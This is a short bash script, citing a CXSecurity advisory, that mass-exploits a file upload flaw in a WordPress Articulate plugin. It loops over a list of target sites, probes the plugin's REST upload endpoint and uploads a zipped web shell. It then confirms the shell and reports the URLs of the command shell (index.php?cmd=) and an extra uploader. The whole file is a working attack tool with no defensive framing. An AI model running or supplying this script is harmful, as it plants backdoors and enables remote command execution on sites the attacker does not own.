#!/bin/bash
# CXSECUR: https://cxsecurity.com/issue/WLB-2019060146
# Just add parameter ?cmd={COMMAND} in /wp-content/uploads/articulate_uploads/asu/index.php?cmd=ls
green='\e[92m'
blue='\e[34m'
red='\e[31m'
white='\e[39m'
for site in `cat $1`;
do
  ck=$(curl -s --url "$site/index.php/wp-json/articulate/v1/upload-data")
  if [[ $ck =~ "rest_no_route" ]];
  then 
    printf "$green[+] $site -> Maybe Vuln\n"
    mes=$(curl -s -F "name=asu.zip" -F "chunk=2" -F "chunks=3" -F "file=@asu.zip" --url "$site/index.php/wp-json/articulate/v1/upload-data")
    if [[ $mes =~ "Upload Complete!" ]];
    then
      printf "$green[+] Success Uploading Shell ...\n"
      printf "$blue[!] Checking Shell ...\n";
      moe=$(curl -s --url "$site/wp-content/uploads/articulate_uploads/asu/index.html")
      if [[ $moe =~ "plantsec" ]];
      then
        printf "$green[+] Shell Found ... $site/wp-content/uploads/articulate_uploads/asu/index.php\n"
        printf "$green[+] Uploader ... $site/wp-content/uploads/articulate_uploads/asu/upl.php\n\n"
      else
        printf "$red[-] Shell Not Found ...\n\n"
      fi
    else
      printf "$red[-] Not Vuln ...\n\n" 
    fi
  else
    printf "$red[-] $site -> Not Vuln ...\n\n"
  fi
done
printf "$white"
